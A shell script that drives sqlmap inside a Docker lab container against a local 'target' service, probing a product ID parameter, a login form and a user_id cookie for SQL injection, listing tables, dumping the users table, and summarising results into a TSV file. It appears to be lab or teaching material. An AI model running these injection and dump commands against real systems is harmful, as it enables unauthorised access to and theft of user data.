#!/usr/bin/env sh
set -eu

SCRIPT_DIR="$(CDPATH= cd -- "$(dirname -- "$0")" && pwd)"
BASE_URL="${BASE_URL:-http://target:8080}"

docker compose -f "$SCRIPT_DIR/docker-compose.yml" exec -T scanner sh -s -- \
  "$BASE_URL" <<'EOF'
set -eu

BASE_URL="$1"
OUTPUT_DIR="/work/outputs"
SQLMAP_DIR="$OUTPUT_DIR/sqlmap-output"

mkdir -p "$OUTPUT_DIR"
rm -rf "$SQLMAP_DIR"
rm -f "$OUTPUT_DIR"/*.txt "$OUTPUT_DIR"/*.json "$OUTPUT_DIR"/*.tsv "$OUTPUT_DIR"/*.request

sqlmap --version > "$OUTPUT_DIR/version.txt" 2>/dev/null
curl -sS "$BASE_URL/api/status" > "$OUTPUT_DIR/http-status.json"

COMMON_ARGS="--batch --dbms=SQLite --level=1 --risk=1 --threads=1 --flush-session --output-dir=$SQLMAP_DIR"

sqlmap \
  -u "$BASE_URL/product?id=1" \
  $COMMON_ARGS \
  --answers="follow=N" \
  | tee "$OUTPUT_DIR/get-detect.txt"

sqlmap \
  -u "$BASE_URL/product?id=1" \
  $COMMON_ARGS \
  --tables \
  | tee "$OUTPUT_DIR/tables.txt"

sqlmap \
  -u "$BASE_URL/product?id=1" \
  $COMMON_ARGS \
  -T users --dump \
  | tee "$OUTPUT_DIR/users-dump.txt"

cat > "$OUTPUT_DIR/login.request" <<REQ
POST /login HTTP/1.1
Host: target:8080
Content-Type: application/x-www-form-urlencoded
Connection: close

username=admin&password=packetlab
REQ

sqlmap \
  -u "$BASE_URL/login" \
  --data "username=admin&password=packetlab" \
  -p username \
  $COMMON_ARGS \
  | tee "$OUTPUT_DIR/post-detect.txt"

sqlmap \
  -u "$BASE_URL/profile" \
  --cookie "user_id=1" \
  --param-filter=COOKIE \
  -p user_id \
  --batch --dbms=SQLite --level=2 --risk=1 --threads=1 --flush-session --output-dir="$SQLMAP_DIR" \
  | tee "$OUTPUT_DIR/cookie-detect.txt"

{
  printf 'scan\tstatus\n'
  for file in get-detect tables users-dump post-detect cookie-detect; do
    if grep -qi "Table: users" "$OUTPUT_DIR/$file.txt"; then
      printf '%s\tusers table dumped\n' "$file"
    elif grep -qi "\\[4 tables\\]" "$OUTPUT_DIR/$file.txt"; then
      printf '%s\ttables listed\n' "$file"
    elif grep -qi "is vulnerable" "$OUTPUT_DIR/$file.txt"; then
      printf '%s\tvulnerable parameter detected\n' "$file"
    elif grep -qi "fetched data logged" "$OUTPUT_DIR/$file.txt"; then
      printf '%s\tdata fetched\n' "$file"
    else
      printf '%s\tcompleted\n' "$file"
    fi
  done
} > "$OUTPUT_DIR/summary.tsv"
EOF

echo "Generated sqlmap lab outputs."
